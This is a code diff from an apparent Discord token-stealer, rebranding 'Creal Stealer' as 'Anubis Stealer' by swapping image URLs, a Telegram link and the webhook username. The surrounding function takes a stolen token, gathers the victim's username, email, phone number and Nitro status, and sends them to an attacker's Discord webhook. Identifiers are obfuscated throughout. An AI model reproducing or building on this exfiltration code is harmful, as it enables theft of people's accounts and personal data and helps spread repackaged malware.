@@ -432,7 +432,7 @@ def upl05dT4k31(t0k3n, path):
     us3rn4m1, hashtag, em31l, idd, pfp, flags, n1tr0, ph0n3 = G3tT0k4n1nf9(t0k3n)
 
     if pfp == None: 
-        pfp = "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+        pfp = "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png"
     else:
         pfp = f"https://cdn.discordapp.com/avatars/{idd}/{pfp}"
 
@@ -509,16 +509,16 @@ def upl05dT4k31(t0k3n, path):
                 "icon_url": f"{pfp}"
                 },
             "footer": {
-                "text": "Creal Stealer | https://t.me/CrealStealer",
-                "icon_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg"
+                "text": "Anubis Stealer | https://t.me/AnubisNetworkk",
+                "icon_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png"
                 },
             "thumbnail": {
                 "url": f"{pfp}"
                 }
             }
         ],
-        "avatar_url": "https://raw.githubusercontent.com/Ayhuuu/Creal-Stealer/main/img/xd.jpg",
-        "username": "Creal Stealer",
+        "avatar_url": "https://images-ext-2.discordapp.net/external/A6VFzyqsfSGAaG3xdZOFAAI0DlOe8XouFTqbU1koOzo/%3Fsize%3D4096/https/cdn.discordapp.com/icons/1194296697065590905/9c7e3c64af7413e02caa6968c01d4ffc.png",
+        "username": "Anubis Stealer",
         "attachments": []
         }
     L04durl1b(wh00k, data=dumps(data).encode(), headers=headers)
